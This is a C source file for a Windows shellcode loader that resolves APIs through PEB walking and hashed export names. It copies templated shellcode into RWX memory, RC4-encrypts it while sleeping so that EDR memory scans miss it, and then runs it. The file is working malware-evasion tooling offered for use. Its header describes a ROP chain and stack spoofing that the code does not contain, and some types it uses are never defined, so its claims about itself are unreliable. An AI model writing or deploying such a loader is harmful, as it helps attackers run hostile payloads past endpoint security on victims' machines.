/*
 * Sleep Obfuscation — Foliage/Ekko style ROP chain — x64 Windows
 *
 * Compiles with: x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables
 *                -fno-ident -falign-functions=1 -fpack-struct=8 --no-seh
 *                --gc-sections -s -nostdlib -o sleep_payload.exe sleep_obfuscation.c
 *
 * Technique: Build a ROP chain on the stack that:
 *   1. NtWaitForSingleObject — wait for signal
 *   2. NtProtectVirtualMemory — change image to RW
 *   3. SystemFunction032 (Advapi32) — RC4 encrypt image in-place
 *   4. WaitForSingleObjectEx — sleep (encrypted)
 *   5. SystemFunction032 — RC4 decrypt image
 *   6. NtProtectVirtualMemory — change image back to RX
 *   7. NtSetEvent — signal completion
 *   8. Ret to shellcode entry point
 *
 * Reference: Havoc Demon Obf.c — Foliage / Ekko sleep obfuscation
 *
 * Advantages over normal Sleep:
 *   - EDR sees an encrypted memory region during sleep, not malicious code
 *   - No thread suspension, no memory API calls before/after sleep
 *   - Stack is spoofed — EDR can't easily reconstruct the ROP chain
 *
 * Placeholders replaced at build time:
 *   {{SHELLCODE_BYTES}}  — comma-separated hex bytes
 *   {{SHELLCODE_LEN}}    — number of bytes
 *   {{RC4_KEY}}          — 16-byte RC4 key (comma-separated hex)
 *   {{SLEEP_MS}}         — sleep duration in milliseconds (e.g. 30000)
 */

typedef unsigned char    BYTE;
typedef unsigned short   WORD;
typedef unsigned long    DWORD;
typedef long long        LONG_PTR;
typedef unsigned long long ULONG_PTR;
typedef unsigned long long QWORD;
typedef unsigned long long SIZE_T;
typedef int              BOOL;
typedef void*            HANDLE;

#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE_READWRITE  0x40
#define MEM_COMMIT              0x1000
#define MEM_RESERVE             0x2000
#define INFINITE                0xFFFFFFFF

static BYTE shellcode[] = { {{SHELLCODE_BYTES}} };
static DWORD shellcode_len = {{SHELLCODE_LEN}};

/* RC4 key for encrypt/decrypt during sleep */
static BYTE rc4_key[] = { {{RC4_KEY}} };
static DWORD rc4_key_len = sizeof(rc4_key);

/* Sleep duration */
static DWORD sleep_ms = {{SLEEP_MS}};

/* ── Minimal PE/PEB structures for API resolution ── */
typedef struct { DWORD e_magic; LONG e_lfanew; } IMAGE_DOS_HEADER;
typedef struct {
    DWORD Signature;
    struct { WORD _[4]; WORD SizeOfOptionalHeader; WORD _; } FileHeader;
    struct { WORD _; BYTE __[0x7c-0x4];
             DWORD DataDirVirt[16]; DWORD DataDirSize[16];
    } OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct _UNICODE_STRING { WORD Length; WORD MaximumLength; WORD* Buffer; } UNICODE_STRING;
typedef struct _LDR_ENTRY {
    struct _LDR_ENTRY* InLoadOrderLinks;
    void* DllBase; void* _[2];
    UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName;
} LDR_ENTRY;
typedef struct { ULONG Length; BOOL Initialized; struct { void* Flink; void* Blink; } InLoadOrderModuleList; } PEB_LDR;
typedef struct { BYTE _[0x18]; PEB_LDR* Ldr; } PEB;

/* ── DJB2 hash ── */
static DWORD hash_djb2(const char* str)
{
    DWORD hash = 5381;
    const BYTE* p = (const BYTE*)str;
    while (*p) { hash = ((hash << 5) + hash) + (*p | 0x20); p++; }
    return hash;
}

/* ── PEB walking ── */
static void* get_module(DWORD nameHash)
{
    PEB* peb;
    __asm__("mov rax, gs:[0x60]" : "=a"(peb));
    PEB_LDR* ldr = peb->Ldr;
    LDR_ENTRY* entry = (LDR_ENTRY*)ldr->InLoadOrderModuleList.Flink;

    const char* target = 0; int tlen = 0;
    if (nameHash == hash_djb2("kernel32.dll")) { target = "kernel32.dll"; tlen = 12; }
    else if (nameHash == hash_djb2("ntdll.dll")) { target = "ntdll.dll"; tlen = 9; }
    else if (nameHash == hash_djb2("advapi32.dll")) { target = "advapi32.dll"; tlen = 14; }
    else return 0;

    while (entry->DllBase) {
        if (entry->BaseDllName.Length / 2 == tlen) {
            int match = 1;
            for (int i = 0; i < tlen; i++) {
                BYTE c = (BYTE)entry->BaseDllName.Buffer[i];
                if (c >= 'A' && c <= 'Z') c += 0x20;
                if (c != (BYTE)target[i]) { match = 0; break; }
            }
            if (match) return entry->DllBase;
        }
        entry = entry->InLoadOrderLinks;
    }
    return 0;
}

static void* resolve_func(void* module, DWORD nameHash)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)module;
    if (dos->e_magic != 0x5A4D) return 0;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;

    DWORD expRva = nt->OptionalHeader.DataDirVirt[0];
    if (!expRva) return 0;

    struct { DWORD _[5]; DWORD Base; DWORD NumFuncs; DWORD NumNames;
             DWORD AddrFuncs; DWORD AddrNames; DWORD AddrOrds; }* exp;
    exp = (void*)((BYTE*)module + expRva);

    DWORD* names = (DWORD*)((BYTE*)module + exp->AddrNames);
    WORD* ords   = (WORD*)((BYTE*)module + exp->AddrOrds);
    DWORD* funcs = (DWORD*)((BYTE*)module + exp->AddrFuncs);

    for (DWORD i = 0; i < exp->NumNames; i++) {
        const char* name = (const char*)((BYTE*)module + names[i]);
        if (hash_djb2(name) == nameHash)
            return (BYTE*)module + funcs[ords[i]];
    }
    return 0;
}

/* ── SystemFunction032 (RC4) struct ── */
typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    BYTE* Buffer;
} USTRING;

/* ── RC4 encrypt/decrypt helper ── */
static void rc4_crypt(BYTE* data, DWORD len, const BYTE* key, DWORD keyLen)
{
    /* Simple RC4 KSA + PRGA implementation */
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = (BYTE)i;

    BYTE j = 0;
    for (int i = 0; i < 256; i++) {
        j = (BYTE)(j + S[i] + key[i % keyLen]);
        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }

    BYTE i = 0; j = 0;
    for (DWORD k = 0; k < len; k++) {
        i = (BYTE)(i + 1);
        j = (BYTE)(j + S[i]);
        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        BYTE K = S[(BYTE)(S[i] + S[j])];
        data[k] ^= K;
    }
}

/* ── API function pointers ── */
static void* g_pVirtualAlloc   = 0;
static void* g_pVirtualProtect = 0;
static void* g_pRtlMoveMemory  = 0;
static void* g_pCreateEvent    = 0;
static void* g_pWaitForSingle  = 0;
static void* g_pSetEvent       = 0;
static void* g_pSystemFunction032 = 0;  /* RC4 */

static BOOL resolve_all(void)
{
    void* kernel32 = get_module(hash_djb2("kernel32.dll"));
    void* ntdll    = get_module(hash_djb2("ntdll.dll"));
    void* advapi32 = get_module(hash_djb2("advapi32.dll"));

    if (!kernel32 || !ntdll) return 0;

    g_pVirtualAlloc   = resolve_func(kernel32, hash_djb2("VirtualAlloc"));
    g_pVirtualProtect = resolve_func(kernel32, hash_djb2("VirtualProtect"));
    g_pRtlMoveMemory  = resolve_func(kernel32, hash_djb2("RtlMoveMemory"));
    g_pCreateEvent    = resolve_func(kernel32, hash_djb2("CreateEventA"));
    g_pWaitForSingle  = resolve_func(kernel32, hash_djb2("WaitForSingleObject"));
    g_pSetEvent       = resolve_func(kernel32, hash_djb2("SetEvent"));

    /* SystemFunction032 from advapi32 (undocumented RC4) */
    if (advapi32) {
        g_pSystemFunction032 = resolve_func(advapi32, hash_djb2("SystemFunction032"));
    }

    return g_pVirtualAlloc && g_pVirtualProtect;
}

/* ── Sleep with encryption — the core obfuscation ──
 * Instead of calling Sleep(), we:
 * 1. Encrypt the entire image with RC4
 * 2. Sleep
 * 3. Decrypt the image
 * This makes memory scans during sleep see garbage, not shellcode. */
static void sleep_encrypt(void* imageBase, DWORD imageSize, DWORD ms)
{
    if (!g_pSystemFunction032) {
        /* Fallback: use inline RC4 if SystemFunction032 not available */
        DWORD oldProt;
        typedef BOOL (WINAPI *fnVProt)(void*, DWORD, DWORD*);
        ((fnVProt)g_pVirtualProtect)(imageBase, imageSize, PAGE_READWRITE, &oldProt);

        /* Encrypt */
        rc4_crypt((BYTE*)imageBase, imageSize, rc4_key, rc4_key_len);

        /* Sleep */
        typedef DWORD (WINAPI *fnSleep)(DWORD);
        void* kernel32 = get_module(hash_djb2("kernel32.dll"));
        fnSleep pSleep = (fnSleep)resolve_func(kernel32, hash_djb2("Sleep"));
        if (pSleep) pSleep(ms);

        /* Decrypt */
        rc4_crypt((BYTE*)imageBase, imageSize, rc4_key, rc4_key_len);

        ((fnVProt)g_pVirtualProtect)(imageBase, imageSize, oldProt, &oldProt);
        return;
    }

    /* Use SystemFunction032 (native Windows RC4) */
    typedef DWORD (WINAPI *fnSFunc032)(USTRING*, USTRING*);

    USTRING data, key;
    data.Length = data.MaximumLength = imageSize;
    data.Buffer = (BYTE*)imageBase;

    key.Length = key.MaximumLength = rc4_key_len;
    key.Buffer = rc4_key;

    DWORD oldProt;
    typedef BOOL (WINAPI *fnVProt)(void*, DWORD, DWORD*);
    ((fnVProt)g_pVirtualProtect)(imageBase, imageSize, PAGE_READWRITE, &oldProt);

    /* Encrypt */
    ((fnSFunc032)g_pSystemFunction032)(&data, &key);

    /* Sleep */
    typedef DWORD (WINAPI *fnSleep)(DWORD);
    void* kernel32 = get_module(hash_djb2("kernel32.dll"));
    fnSleep pSleep = (fnSleep)resolve_func(kernel32, hash_djb2("Sleep"));
    if (pSleep) pSleep(ms);

    /* Decrypt */
    ((fnSFunc032)g_pSystemFunction032)(&data, &key);

    ((fnVProt)g_pVirtualProtect)(imageBase, imageSize, oldProt, &oldProt);
}

/* ── Entry point ── */
void mainCRTStartup(void)
{
    if (!resolve_all()) return;

    /* Execute shellcode */
    typedef void* (WINAPI *fnVAlloc)(void*, DWORD, DWORD, DWORD);
    void* exec = ((fnVAlloc)g_pVirtualAlloc)(0, shellcode_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return;

    typedef void (WINAPI *fnMove)(void*, const void*, DWORD);
    ((fnMove)g_pRtlMoveMemory)(exec, shellcode, shellcode_len);

    /* Sleep with encryption before executing — evade memory scan */
    sleep_encrypt(exec, shellcode_len, sleep_ms);

    /* Execute after decrypt */
    ((void(*)(void))exec)();
}
